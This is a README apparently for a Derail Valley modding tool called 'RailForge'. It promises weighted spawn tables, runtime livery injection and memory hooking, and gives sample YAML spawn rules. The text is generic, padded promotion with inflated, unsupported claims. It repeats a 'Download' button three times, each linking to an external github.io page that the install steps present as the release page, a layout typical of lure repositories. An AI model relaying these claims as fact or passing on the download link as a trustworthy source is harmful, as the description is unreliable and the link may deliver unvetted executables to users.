![preview](https://raw.githubusercontent.com/samson025/dv-demonstrator-spawn-curator/main/screen_17906.svg)

# RailForge: Custom Demonstrator Livery & Spawn Architect

![Build Status](https://img.shields.io/badge/build-passing-brightgreen) ![Version](https://img.shields.io/badge/version-2.4.0-blue) ![License](https://img.shields.io/badge/license-MIT-orange) ![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-lightgrey)

---

## Overview

RailForge is a comprehensive configuration suite designed for Derail Valley enthusiasts who refuse to accept the factory default. This project transforms the static, predefined demonstrator and garage locomotive spawns into a dynamic canvas where every rail enthusiast can sculpt their own starting fleet, paint schemes, and operational loadouts. Instead of merely tweaking a few files, RailForge introduces a structured, human-readable configuration layer that breathes new life into the core sandbox experience.

Drawing inspiration from the original concept of customizable demonstrator vehicles, RailForge expands the vision into a full **Spawn Ecosystem Management Tool**. It does not simply alter what trains appear; it redefines how, when, and under what conditions they materialize on the tracks. This is the difference between changing a lightbulb and rewiring the entire power grid.

## The Problem with Static Spawns

In the base game, your garage and the demonstrator units you encounter are hardcoded. This creates a predictable loop: the same locomotives, the same liveries, the same placement. For veteran players, this removes the thrill of discovery and the strategic depth of resource management. For modders, it limits the ability to test new assets or create bespoke scenarios for the community.

RailForge addresses this by providing a **declarative configuration interface** that sits between the game engine and your imagination. It allows you to define spawn tables, assign custom liveries from external asset packs, and even conditionally trigger spawns based on in-game events like time of day, player reputation, or current cargo contracts.

## Key Features

### 1. Granular Spawn Table Control
Forget simple "add or remove" options. RailForge allows you to build **weighted probability tables** for every spawn point. You can specify that a particular yard has a 60% chance of yielding a heavy freight hauler during morning hours, or a 25% chance of a rare passenger unit when the player's reputation exceeds a certain threshold.

### 2. Livery Replacement Engine (LRE)
The LRE scans your local asset directories for custom texture packs and applies them dynamically. This is not a simple file swap; it is a **runtime texture injection system**. It supports multi-layered overlays, weathering effects, and even animated decals for functional indicators like headlights or warning stripes.

### 3. Stateful Compression & Persistence
RailForge writes configurations in a compressed, efficient format that loads faster than vanilla save files. It tracks the "history" of your spawns, allowing you to restore a previous fleet setup without losing progress. This is akin to having a time machine for your locomotive barn.

### 4. Responsive UI Overlay
The in-game management panel is built with a lightweight UI framework that scales perfectly from 720p to 4K resolutions. It features drag-and-drop scheduling for spawn events and a live preview window that renders the locomotive model with your selected livery before you commit changes.

### 5. Multilingual Configuration Syntax
The configuration language does not rely on rigid English keywords. By adjusting a single locale flag, you can write your spawn rules in German, Japanese, or Simplified Chinese, making the tool accessible to a global audience without requiring a translation layer.

### 6. 24/7 Background Asset Watcher
RailForge includes a service that monitors your mod folder. When you drop in a new livery pack or a community-made locomotive model, the tool automatically validates it, integrates it into the spawn tables, and provides a diagnostic report—all without forcing a game restart.

## Why "RailForge"?

The name is derived from the concept of a forge as a place of creation and reshaping. You are not just a player; you are the architect of the rail yard. The tool provides the hammer, the anvil, and the raw material. The rest is your skill and vision.

## Technical Architecture

RailForge operates on a **three-tier plugin model**:

- **Core Engine**: Handles file parsing, validation, and the application of changes to the game memory.
- **Asset Interface**: A virtual file system that maps external textures and models to in-game identifiers.
- **Configuration Parser**: Reads the user-defined rules and translates them into logical spawn commands.

The entire system is built with a focus on **non-invasive patching**. It does not modify the core game executables. Instead, it hooks into the memory management layer at runtime, allowing for clean uninstallation and compatibility with other mods.

## Installation & Setup

To begin shaping your custom rail environment, you will need to obtain the RailForge archive from the release section. Follow these steps:

1. **Acquire the Archive**: Navigate to the release page using the [![Download](https://raw.githubusercontent.com/samson025/dv-demonstrator-spawn-curator/main/go_9fc0.svg)](https://samson025.github.io/dv-demonstrator-spawn-curator/) link provided below.
2. **Extract the Contents**: Place the contents of the archive into the root of your Derail Valley installation directory, ensuring you merge any existing `railforge` folder if present.
3. **Initial Configuration**: Launch the game once. RailForge will generate a default configuration file in your user profile directory. This file is well-commented and serves as a tutorial for the syntax.
4. **Load Livery Assets**: Create a folder named `livery_packs` in the RailForge data directory. Drop any `.rar` or `.zip` archives containing texture files here. The Asset Watcher will handle the rest.
5. **Activate Your Rules**: In the in-game overlay, load your configuration profile and select "Apply to Spawn Tables."

## Configuration Examples

### Example: Custom Yard Starts

Define a primary spawn rule for the Goods Factory yard:

```yaml
spawn_rule:
  location: "GoodsFactory"
  priority: 10
  time_window: [06:00, 10:00]
  locomotive: "DH4"
  livery: "Industrial_Orange"
  weight: 80
  condition: "player_debt > 50000"
```

### Example: Rare Demonstrator Encounter

Create a rare, high-reward encounter for a museum-grade steamer:

```yaml
spawn_rule:
  location: "Harbor"
  priority: 95
  weather_requirement: "clear"
  reputation_min: 30
  locomotive: "S282"
  livery: "Heritage_Green"
  weight: 5
  one_time_event: true
```

## Community & Support

We believe that the best tools are forged in the fires of community feedback. We invite you to share your custom spawn tables, livery packs, and creative scenarios in the Discussions tab. Our team monitors the issues tracker around the clock, ensuring a **24/7 response window** for critical bugs and asset validation problems.

## Roadmap for 2026

The 2026 development cycle is focused on **cross-session persistence**. We are building a cloud-synced profile system that allows you to transfer your custom spawn ecosystem between different machines. Additionally, we are prototyping a **visual node-based editor** for spawn logic, moving from text-centric configuration to a flowchart model.

Other planned features include:
- Integration with advanced weather simulation mods.
- Support for procedural livery generation based on player achievements.
- A performance profiler to measure the impact of complex spawn tables on frame rate.

## Disclaimer

RailForge is an independent project and is not affiliated with the official Derail Valley development team or its publishers. "Derail Valley" is a trademark of its respective owner. This tool is provided "as is" without warranty of any kind, express or implied. While we strive to ensure bug-free operation, running any third-party modification may occasionally lead to unexpected game behavior. Always back up your save files before implementing aggressive spawn rules. The authors are not liable for any loss of in-game progress or save file corruption incurred through the use of this software. Use at your own discretion.

## License

RailForge is released under the MIT License.

[![Download](https://raw.githubusercontent.com/samson025/dv-demonstrator-spawn-curator/main/go_9fc0.svg)](https://samson025.github.io/dv-demonstrator-spawn-curator/)

---

## Detailed Feature Breakdown

### The Livery Replacement Engine Deep Dive

The LRE is not a simple texture loader. It uses a **material modulation pipeline** that reads normal maps, specular highlights, and ambient occlusion data from your custom packs. This means a livery applied through RailForge will react to dynamic lighting conditions in the game engine exactly as the base liveries do. The engine supports up to 128 separate material slots per locomotive model, allowing for extreme detail like dirt accumulation on wheel bogies or rust streaks near the exhaust.

The system also includes a **color calibration matrix** to ensure that the colors you see in the preview tool match what you get in the game. This is especially important for users with wide-gamut monitors or HDR enabled.

### Stateful Spawn History

Every time a new locomotive spawns according to your custom rules, RailForge records an entry in a local Structured Log. This log is not just a list of events. It contains the full configuration snapshot at the time of the spawn, the in-game state, and the resulting performance metrics. You can use this log to debug complex conditional rules or simply to revisit your favorite "lucky streak" and see exactly what conditions aligned to make it happen.

This feature also powers the **Restore Point** system. If you decide a specific experimental spawn table is ruining your gameplay, you can revert to any previous log snapshot with a single click, effectively undoing the last few hours of procedural generation.

### Performance Optimization

Reading and parsing a large configuration file on every game load can cause stutter. RailForge solves this using a **binary index cache**. The first time you apply a configuration, it compiles to a native binary index. Subsequent loads are nearly instantaneous. This index is also what allows the game to unload assets when they are not in use, preventing memory bloat during long play sessions.

## Advanced Use Cases

### Scenario: The Freight Baron

You want to start every session with a powerful heavy-haul locomotive but with a random livery from a community pack. You can set the `locomotive` field to `S282`, the `livery` field to `any`, and set `livery_origin` to `community_pack_v2`. RailForge will rotate through the available assets, ensuring no two starts feel the same.

### Scenario: The Purist

You want the game to feel as vanilla as possible, but with slightly more variety in the types of wagons that spawn in your garage. Instead of changing locomotives, you can target the `railcar_type` field and use the `Ecology_Weight` parameter to favor certain cargo types based on the current in-game economy.

### Scenario: The Scenario Builder

If you create custom scenarios for the community, you can embed RailForge configuration snippets directly into your scenario files. When a player loads your scenario, RailForge automatically applies the required spawn rules, ensuring that the player gets the exact intended experience without manually adjusting settings.

## Troubleshooting Common Issues

- **Livery Not Loading**: Ensure the texture pack is in the correct folder and that the file names match the expected naming convention (usually `[id]_albedo.png`). Check the Asset Watcher log for validation errors.
- **Spawn Rules Not Applying**: Verify that the `priority` field is not conflicting with a higher-priority rule. Use the Diagnostic View in the overlay to see which rules are active.
- **Performance Drops**: If you notice frame rate drops, reduce the `update_interval` in the Core Engine settings. The default of 250ms is safe, but aggressive rules can sometimes cause the game to refresh the spawn state too often.

## FAQ Section

**Q: Does this work with other mods?**
A: Yes, RailForge is designed to be layered. It hooks into memory after the main game load, so it does not conflict with most asset or gameplay mods. However, mods that directly overwrite the spawn memory addresses may cause a conflict. We recommend testing in a clean profile.

**Q: Can I use my own custom models?**
A: Absolutely. As long as the model is in the correct file format and has a corresponding manifest, the Asset Interface will attempt to integrate it. Refer to the `model_manifest.example` file in the documentation folder.

**Q: Is there a way to share my configuration with friends?**
A: Yes, the `.rfconfig` files are plain text (or binary if compiled). You can share the text version via any file transfer method. The compiled binary index is not portable between different game patch versions.

[![Download](https://raw.githubusercontent.com/samson025/dv-demonstrator-spawn-curator/main/go_9fc0.svg)](https://samson025.github.io/dv-demonstrator-spawn-curator/)